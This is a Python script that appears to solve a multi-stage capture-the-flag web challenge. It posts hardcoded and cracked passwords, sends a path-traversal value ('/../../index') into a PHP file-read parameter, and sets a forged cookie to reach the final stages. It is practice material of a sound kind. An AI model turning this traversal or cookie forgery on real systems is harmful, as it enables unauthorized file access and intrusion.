import requests

url = "http://hackers.gg:8006/"
stage2 = url + "stage2.php"

#print("*===STAGE1===*")
#page = requests.get(url)
#print(page.text)

print("*===STAGE2===*")
password = "wh00,0bfu5c4710n!"
page = requests.get(stage2)
page = requests.post(stage2, data = {'auth':password})
print(page.text)
#print("HEADERS")
#print(page.headers)

print("*===STAGE2 LOGIN===*")
stage2login = url + "stage2login.php"
page = requests.get(stage2login)
print(page.text)

print("*===STAGE 3 part 1===*")
hash = "f25a2fc72690b780b2a14e140ef6a9e0"
password = "iloveyou" # this is the reverse of the md5 hash above
stage3 = url + "dir1/dir2/stage3.php"
page = requests.post(stage3, data = {"uname2":"itzel",'pass2':password})
#page = requests.post(stage3, data = {"exploit":""})
print(page.text)

print("*===STAGE 3 part 2===*")
code = "$filetext = file_get_contents($_POST['filename'].'.php');"
password = "iloveyou" # this is the reverse of the md5 hash above
stage3 = url + "dir1/dir2/stage3.php"
page = requests.post(stage3, data = {"uname2":"Itzel",'pass2':password, "exploit":"/../../index", "submitexploit":"Submit"})
print(page.text)
print(page.headers)
print(page)

print("*===COOKIE TEST===*")
#cookies = dict(cookies_are = 'working')
cookies = {}
cookies["cookies_areeee"] = "WORKING!!"
r = requests.get("http://httpbin.org/cookies", cookies = cookies)
print(r.text)

print("*===STAGE 4===*")
stage4 = url + "tgbyhnujmedc.php"
lounge = url + "MitigatorsLounge.php"
final = url + "final.php"
cookies = {}
cookies["pass"] = "OMGTHEWORLDISENDING"
page = requests.get(lounge, cookies = cookies)
print(page.text)
print(page.cookies)

print("*===STAGE FINAL===*")
page = requests.get(final, cookies = cookies)
print(page.text)

print("*===STAGE FINALAUTH===*")
finalauth = url + "finalauth.php"
page = requests.post(finalauth, data = {"month":"December"}, cookies = cookies)
print(page.text)


